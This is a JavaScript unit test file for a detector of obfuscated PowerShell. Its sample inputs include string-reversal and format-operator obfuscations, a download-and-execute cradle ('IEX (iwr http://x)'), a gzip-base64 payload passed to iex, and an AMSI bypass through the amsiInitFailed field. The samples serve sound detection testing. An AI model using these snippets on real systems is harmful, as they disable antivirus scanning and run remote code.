'use strict';
// ════════════════════════════════════════════════════════════════════════════
// cmd-obfuscation-phase5-backfill.test.js — Back-fill PowerShell coverage.
//
// Phase E: earlier phases relied on grammar fuzz + e2e / YARA coverage
// to pin `PowerShell String Reversal` and `PowerShell Format Operator
// (-f)`. Neither had a dedicated unit-level regression test until this
// commit. This file anchors both to the direct `_findCommandObfuscation
// Candidates` path so an accidental regex tightening at the decoder
// fails here first, long before the fuzz regressions catch it on a
// green-CI re-run.
// ════════════════════════════════════════════════════════════════════════════

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/ps-mini-evaluator.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();
function pick(cands, pred) { return host(cands.filter(pred)); }

// ── PowerShell String Reversal ────────────────────────────────────────────

test('backfill: PowerShell String Reversal — `noisserpxE-ekovnI[-1..-100] -join \'\'` decodes', () => {
  const text = "$x = 'noisserpxE-ekovnI'[-1..-100] -join ''''; iex $x";
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /String Reversal/.test(c.technique));
  assert.ok(hits.length >= 1, `expected reversal; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'Invoke-Expression');
});

test('backfill: PowerShell String Reversal — `DownloadString` reversed form', () => {
  const text = "'gnirtSdaolnwoD'[-1..-100] -join ''''";
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /String Reversal/.test(c.technique));
  assert.ok(hits.length >= 1);
  assert.equal(hits[0].deobfuscated, 'DownloadString');
});

test('backfill: PowerShell String Reversal — short reversals are bounded', () => {
  // The reversal regex requires the literal body to be >= 4 chars (the
  // `{4,80}` quantifier). A 3-char body must NOT match.
  const text = "'abc'[-1..-100] -join ''''";
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /String Reversal/.test(c.technique));
  assert.equal(hits.length, 0);
});

// ── PowerShell Format Operator (-f) ───────────────────────────────────────

test("backfill: Format operator — `'{0}{1}{2}' -f 'Inv','oke-','Expression'` joins tokens", () => {
  const text = "$x = '{0}{1}{2}' -f 'Inv','oke-','Expression'; & $x 'arg'";
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Format Operator/.test(c.technique));
  assert.ok(hits.length >= 1, `expected -f hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

test("backfill: Format operator — two-arg template `'{0}iex{1}' -f '',''` preserves embedded keyword", () => {
  const text = "'{0}iex{1}' -f '',''";
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Format Operator/.test(c.technique));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /iex/);
});

test('backfill: Format operator — benign template without exec-intent is suppressed', () => {
  // `'{0} {1}' -f 'Hello','World'` has no exec-intent keyword in the
  // formatted output; the _EXEC_INTENT_RE gate should suppress it.
  const text = "'{0} {1}' -f 'Hello','World'";
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Format Operator/.test(c.technique));
  assert.equal(hits.length, 0);
});

// ── Cross-check: every emitted PowerShell technique string is
// in the fuzz grammar catalog (avoids drift between runtime labels
// and what the fuzz harness tracks). ────────────────────────────────────
test('backfill: runtime PowerShell technique labels all appear in grammar catalog', () => {
  // Re-derive the catalog directly from the fuzz grammar file to avoid
  // a second source of truth here. If a new decoder technique is added
  // without a catalog entry, this test fails and points at the missing
  // grammar row — catching drift at unit-test time rather than waiting
  // for the fuzz coverage run.
  const path = require('node:path');
  const { POWERSHELL_TECHNIQUE_CATALOG } = require(
    path.resolve(__dirname, '..', 'fuzz', 'helpers', 'grammars', 'powershell-grammar.js'),
  );
  const seen = new Set(POWERSHELL_TECHNIQUE_CATALOG);

  // A canonical seed exercising every PowerShell branch.
  const zlib = require('node:zlib');
  const ctx2 = loadModules([
    'src/constants.js',
    'src/encoded-content-detector.js',
    'src/decoders/safelinks.js',
    'src/decoders/whitelist.js',
    'src/decoders/entropy.js',
    'src/decoders/ioc-extract.js',
    'src/decoders/base64-hex.js',
    'src/decoders/cmd-obfuscation.js',
    'src/decoders/ps-mini-evaluator.js',
  ]);
  ctx2.Decompressor = {
    inflateSync(bytes, format) {
      try {
        const buf = Buffer.from(bytes.buffer || bytes, bytes.byteOffset || 0, bytes.byteLength || bytes.length);
        if (format === 'gzip') return new Uint8Array(zlib.gunzipSync(buf));
        if (format === 'deflate-raw') return new Uint8Array(zlib.inflateRawSync(buf));
        return null;
      } catch (_) { return null; }
    },
  };
  const d2 = new ctx2.EncodedContentDetector();

  // Grab a handful of canonical seeds — every PowerShell technique
  // exercised today. The exhaustive matrix lives in the fuzz seeds;
  // here we anchor the labels we explicitly regression-test elsewhere.
  const toB64U16 = (s) => {
    const b = Buffer.alloc(s.length * 2);
    for (let i = 0; i < s.length; i++) { b[i * 2] = s.charCodeAt(i) & 0xff; b[i * 2 + 1] = (s.charCodeAt(i) >> 8) & 0xff; }
    return b.toString('base64');
  };
  const gzB64 = zlib.gzipSync(Buffer.from('Invoke-Expression iex', 'utf8')).toString('base64');
  const keyArr = Array.from({length: 32}, (_, i) => i).join(',');
  const ctB64 = Buffer.alloc(32, 0x11).toString('base64');

  const sample = [
    "('Down' + 'load' + 'String')",                                           // Concat
    "'XnvXke'.replace('XnvX','Invo').replace('o','o').replace('XressiXn','pression')",
    "pow`er`shell",                                                           // Backtick
    "'{0}{1}' -f 'Inv','oke-Expression'",                                     // -f
    "'noisserpxE-ekovnI'[-1..-100] -join ''''",                               // Reversal
    `$cmd = 'Invoke-Expression'; & ($cmd) 'arg'`,                             // Var Resolution paren
    `$cmd = 'Invoke-Expression'; & $cmd arg`,                                 // Var Resolution call-op
    `powershell -enc ${toB64U16('Invoke-Expression iex')}`,                   // -EncodedCommand
    `[char]73 + [char]69 + [char]88`,                                         // [char]N reassembly
    `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${Buffer.from('Invoke-Expression iex','utf8').toString('base64')}'))`,
    `$b64='${toB64U16('Invoke-Expression iex')}'; powershell -enc $b64`,      // -enc (var)
    `$sb='IEX (iwr http://x)'; [scriptblock]::Create($sb).Invoke()`,          // SB (var)
    `[ScriptBlock].GetMethod("Create", [Type[]]@([string])).Invoke($null, @('IEX (iwr http://x)'))`,
    `$b=[Convert]::FromBase64String('${gzB64}'); $ms=New-Object IO.MemoryStream(,$b); $gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); iex (New-Object IO.StreamReader($gz)).ReadToEnd()`,
    `ConvertTo-SecureString '${ctB64}' -Key @(${keyArr})`,
    `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
    `[Runtime.InteropServices.Marshal]::GetProcAddress($amsi, 'AmsiScanBuffer'); VirtualProtect`,
  ].join('\n\n');

  const cands = d2._findCommandObfuscationCandidates(sample, {});
  const parenCands = d2._findPsVariableResolutionCandidates(sample, {});
  const all = [...cands, ...parenCands];
  const runtimeTechniques = new Set(
    all
      .map(c => c.technique)
      .filter(t => typeof t === 'string' && /^PowerShell/.test(t)),
  );

  for (const t of runtimeTechniques) {
    assert.ok(seen.has(t), `technique "${t}" missing from POWERSHELL_TECHNIQUE_CATALOG`);
  }
});
